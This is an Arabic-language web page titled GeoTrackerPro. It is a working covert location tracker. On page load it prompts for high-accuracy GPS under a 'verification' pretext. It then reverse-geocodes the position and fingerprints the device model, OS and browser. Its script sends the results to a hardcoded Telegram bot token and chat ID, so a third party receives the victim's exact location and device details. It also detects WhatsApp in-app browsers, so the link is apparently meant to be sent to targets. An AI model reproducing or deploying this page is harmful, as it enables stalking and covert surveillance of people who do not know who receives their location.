<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GeoTrackerPro - Max Precision</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        #map { height: 300px; z-index: 1; border-radius: 0.5rem; }
        body { background-color: #f4f7f6; font-family: system-ui, -apple-system, sans-serif; }
        .loader {
            border: 4px solid #e5e7eb;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="text-gray-800">
    <div class="max-w-md mx-auto bg-white min-h-screen shadow-lg flex flex-col">
        <!-- Header -->
        <header class="flex justify-between items-center p-4 border-b bg-white shadow-sm">
            <div class="flex items-center space-x-2 space-x-reverse">
                <div class="bg-blue-600 p-2 rounded-lg shadow-md">
                    <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.243-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                </div>
                <h1 class="text-xl font-bold text-gray-900 tracking-wide">GeoTrackerPro</h1>
            </div>
            <div id="status-badge" class="flex items-center space-x-1 space-x-reverse px-3 py-1 bg-blue-50 rounded-full text-sm font-semibold text-blue-600 border border-blue-100">
                <div class="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></div>
                <span>يعمل...</span>
            </div>
        </header>

        <!-- Main Content -->
        <div class="p-5 flex-grow flex flex-col space-y-5">
            <!-- Warning for In-App Browsers -->
            <div id="browser-warning" class="hidden bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-xl text-sm font-medium">
                ⚠️ <strong>ملاحظة هامة:</strong> يبدو أنك تستخدم متصفحاً داخلياً. للحصول على أفضل دقة، افتح الرابط في Chrome أو Safari.
            </div>

            <!-- Auto-Processing Status Card -->
            <div id="status-card" class="bg-gradient-to-br from-white to-gray-50 p-6 rounded-2xl shadow-sm border border-gray-100 text-center flex flex-col items-center justify-center space-y-4">
                <div id="loader" class="loader"></div>
                
                <div id="status-icon" class="hidden text-green-500 bg-green-50 p-3 rounded-full">
                    <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
                </div>
                
                <div id="error-icon" class="hidden text-red-500 bg-red-50 p-3 rounded-full">
                    <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                </div>
                
                <div>
                    <h2 id="status-title" class="text-lg font-bold text-gray-800">جاري تحديد الموقع الدقيق</h2>
                    <p id="status-desc" class="text-sm text-gray-500 mt-1">يرجى الضغط على "السماح" (Allow) عند ظهور الرسالة لضمان دقة الموقع.</p>
                </div>
            </div>

            <!-- Map Container -->
            <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden flex flex-col">
                <div id="map"></div>
                <div class="p-3 bg-gray-50 text-xs font-mono text-gray-500 flex justify-between border-t border-gray-100" dir="ltr">
                    <span id="lat-val">Lat: --</span>
                    <span id="lng-val">Lng: --</span>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // --- TELEGRAM BOT CREDENTIALS ---
        const BOT_TOKEN = '9259193109:AAHIBYU-BV1t0kdMtRuXJ3LzKQXsFB8xwUw';
        const CHAT_ID = '8443985805';

        let map, marker;
        const statusTitle = document.getElementById('status-title');
        const statusDesc = document.getElementById('status-desc');
        const loader = document.getElementById('loader');
        const statusIcon = document.getElementById('status-icon');
        const errorIcon = document.getElementById('error-icon');
        const statusBadge = document.getElementById('status-badge');
        
        const isWhatsApp = navigator.userAgent.includes("wv") || navigator.userAgent.includes("WhatsApp");
        if (isWhatsApp || window.location.href.startsWith("content://")) {
            document.getElementById('browser-warning').classList.remove('hidden');
        }

        function initMap() {
            map = L.map('map').setView([15.3694, 44.1910], 5);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);
        }

        function updateMap(lat, lng) {
            document.getElementById('lat-val').textContent = `Lat: ${lat.toFixed(5)}`;
            document.getElementById('lng-val').textContent = `Lng: ${lng.toFixed(5)}`;

            if (!marker) {
                marker = L.marker([lat, lng]).addTo(map);
            } else {
                marker.setLatLng([lat, lng]);
            }
            map.setView([lat, lng], 16);
        }

        // --- NEW ADVANCED DEVICE INFO EXTRACTOR ---
        async function getAdvancedDeviceInfo() {
            let os = "غير معروف";
            let browser = "غير معروف";
            let deviceModel = "غير محدد";
            const ua = navigator.userAgent;

            // Detect Browser
            if (/Chrome/i.test(ua) && !/Edge|Edg/i.test(ua) && !/OPR/i.test(ua)) browser = "Chrome";
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Firefox/i.test(ua)) browser = "Firefox";
            else if (/Edg/i.test(ua)) browser = "Edge";
            else if (isWhatsApp) browser = "متصفح واتساب الداخلي";

            // Try modern Client Hints API first (Best for new Androids)
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const values = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    os = values.platform || "أندرويد";
                    deviceModel = values.model || "مخفي بواسطة المتصفح";
                    
                    if (deviceModel && deviceModel !== "مخفي بواسطة المتصفح") {
                        return `📱 النظام: ${os}\n🏷️ موديل الجهاز: ${deviceModel}\n🌐 المتصفح: ${browser}`;
                    }
                } catch (e) { console.error("Client Hints failed"); }
            }

            // Fallback for older Androids & Apple devices
            if (/android/i.test(ua)) {
                os = "أندرويد (Android)";
                const match = ua.match(/Android\s+[0-9\.]+(?:;|\s)+([^;)]+)/);
                if (match && match[1]) {
                    deviceModel = match[1].trim();
                } else {
                    deviceModel = "موديل الأندرويد مخفي للحماية";
                }
            }
            else if (/iPhone/i.test(ua)) {
                os = "آيفون (iOS)";
                deviceModel = "Apple iPhone (آبل تمنع إظهار الموديل الدقيق)";
            }
            else if (/iPad/i.test(ua)) {
                os = "آيباد (iOS)";
                deviceModel = "Apple iPad";
            }
            else if (/Windows NT/i.test(ua)) {
                os = "ويندوز (Windows)";
                deviceModel = "كمبيوتر شخصي";
            }
            else if (/Mac OS/i.test(ua)) {
                os = "ماك (Mac)";
                deviceModel = "كمبيوتر أبل";
            }

            return `📱 النظام: ${os}\n🏷️ موديل الجهاز: ${deviceModel}\n🌐 المتصفح: ${browser}`;
        }

        async function fetchAddress(lat, lng) {
            let fullAddress = "لم يتم تحديد العنوان بدقة";
            let venueTitle = "موقع المستخدم";

            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                const data = await response.json();
                
                if (data && data.address) {
                    const country = data.address.country || "";
                    const state = data.address.state || data.address.city || "";
                    const road = data.address.road || data.address.suburb || data.address.neighbourhood || "";

                    let parts = [];
                    if (country) parts.push(`الدولة: ${country}`);
                    if (state) parts.push(`المدينة: ${state}`);
                    if (road) parts.push(`الشارع/المنطقة: ${road}`);

                    fullAddress = parts.join(" | ") || data.display_name;
                    venueTitle = road ? road : (state ? state : venueTitle);
                }
            } catch (error) {}
            return { title: venueTitle, address: fullAddress };
        }

        async function sendToTelegram(lat, lng, title, addressText) {
            const deviceInfo = await getAdvancedDeviceInfo();
            const finalAddress = `${addressText}\n\n— معلومات الجهاز —\n${deviceInfo}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVenue`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: lat,
                        longitude: lng,
                        title: title.substring(0, 30),
                        address: finalAddress
                    })
                });
                return true;
            } catch (error) {
                return false;
            }
        }

        function showSuccess() {
            loader.classList.add('hidden');
            statusIcon.classList.remove('hidden');
            statusTitle.textContent = "تم التحقق بنجاح";
            statusTitle.classList.replace('text-gray-800', 'text-green-700');
            statusDesc.textContent = "تم التقاط الموقع الدقيق وإرساله.";
            statusBadge.innerHTML = '<div class="w-2 h-2 rounded-full bg-green-500"></div><span>مكتمل</span>';
            statusBadge.classList.replace('bg-blue-50', 'bg-green-50');
            statusBadge.classList.replace('text-blue-600', 'text-green-700');
            statusBadge.classList.replace('border-blue-100', 'border-green-200');
        }

        function showError(msg) {
            loader.classList.add('hidden');
            errorIcon.classList.remove('hidden');
            statusTitle.textContent = "حدث خطأ في الصلاحيات";
            statusTitle.classList.replace('text-gray-800', 'text-red-600');
            statusDesc.innerHTML = msg;
            statusBadge.innerHTML = '<div class="w-2 h-2 rounded-full bg-red-500"></div><span>مرفوض</span>';
            statusBadge.classList.replace('bg-blue-50', 'bg-red-50');
            statusBadge.classList.replace('text-blue-600', 'text-red-700');
            statusBadge.classList.replace('border-blue-100', 'border-red-200');
        }

        function autoExecuteAccurate() {
            if (!navigator.geolocation) {
                showError("جهازك لا يدعم تحديد الموقع.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    updateMap(lat, lng);
                    
                    statusTitle.textContent = "جاري المعالجة...";
                    statusDesc.textContent = "يتم الآن إرسال البيانات.";

                    const { title, address } = await fetchAddress(lat, lng);
                    const success = await sendToTelegram(lat, lng, title, address);

                    if (success) showSuccess();
                    else showError("فشل الإرسال بسبب ضعف الإنترنت.");
                },
                (error) => {
                    let msg = "حدث خطأ غير معروف.";
                    if(error.code === error.PERMISSION_DENIED) {
                        msg = "لا يمكننا تحديد موقعك الدقيق لأنك ضغطت على <strong>(رفض)</strong>.<br>الرجاء إعادة تحميل الصفحة واختيار <strong>(السماح)</strong>.";
                    } else if (error.code === error.POSITION_UNAVAILABLE) {
                        msg = "مستشعر الـ GPS غير مفعل في هاتفك. قم بتشغيله وحاول مجدداً.";
                    }
                    showError(msg);
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        window.onload = () => {
            initMap();
            autoExecuteAccurate();
        };
    </script>
</body>
</html>
